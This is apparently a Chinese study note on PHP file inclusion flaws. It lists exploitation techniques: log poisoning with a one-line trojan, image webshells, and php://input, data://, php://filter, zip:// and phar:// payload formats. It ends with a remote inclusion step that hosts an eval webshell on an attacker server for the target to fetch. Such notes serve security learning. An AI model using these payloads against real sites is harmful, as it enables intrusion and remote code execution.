### 文件包含漏洞

> 只存在于 `php` 中 

---

#### 1、类型

##### (1）本地文件包含

包含存放在目标服务器本地的文件。

##### (2）远程文件包含

包含存放在攻击者服务器的文件。

#### 2、漏洞利用

##### (1）包含本地文件

###### **a 包含系统系统敏感文件**

###### **b 包含图片马**

###### **c 包含日志文件**

- 利用抓包工具提交一句话木马到日志文件
- 包含日志文件
- 利用蚁剑等工具添加好 `Cookie` 然后连接

###### **d 利用 `php` 伪协议进行攻击**

- `php://input` 

  > 前提条件：`php.ini` 文件中的 `allow_url_include` 设置为 `on` 

  格式：

  ```
  php://input
  post:php代码
  ```

- `data://` 

  > 前提条件：`php.ini` 文件中的 `allow_url_include` 设置为 `on` 

  格式：

  ```
  data://text/plain,[php代码]
  data://text/plain;base64,base64编码的php代码
  ```

- `php://filter` 

  过滤器  用来读取目标的源代码

  格式：

  ```
  php://filter/read=convert.base64-encode/resource=index.php
  ```

- `zip://` 

  `zip://` 、`bzip2://` 、`zlib://` 协议，都属于压缩流，可以访问压缩文件中 的子文件

  格式：

  ```
  zip://绝对（相对）路径/xx.zip%23被压缩的文件
  ```

  1、首先将一个 `PHP` 文件添加到 `zip` 压缩文件

  2、将 `zip` 压缩文件上传（如果是白名单检测可以将 `.zip` 后缀修改为合法的后缀）

  3、利用 `zip://` 协议包含该文件

- `phar://` 

  > 适用范围：`php` > 5.3.0。可以绕过网站固定包含文件名后缀的限制

  格式：

  ```
  phar://相对路径/xx.zip/被压缩文件
  ```

###### **e 包含上传文件**

如果目标服务器存在文件包含漏洞的同时又有文件上传的功能，此时可以进行组合利用。

- 首先上传图片马
- 包含图片马

##### (2）远程文件包含

> 前提：`php,ini` 的 `allow_url_fopen` 的值为 `On` （默认开启），并且 `allow_url_include` 的值 
>
> 也为 `On` （默认关闭）。

- 攻击者在自己服务器上新建一个文件，内容为：`<?php eval($_POST['a']);?>` 该文件需要能被 

  服务器访问到，这里使用 `python3` 启动一个 `http` 服务：

  ```
  python3 -m http.server --bind 0.0.0.0 1234
  ```

- 在目标网站提交：`?xx=http://ip地址:端口号/文件` 以包含文件
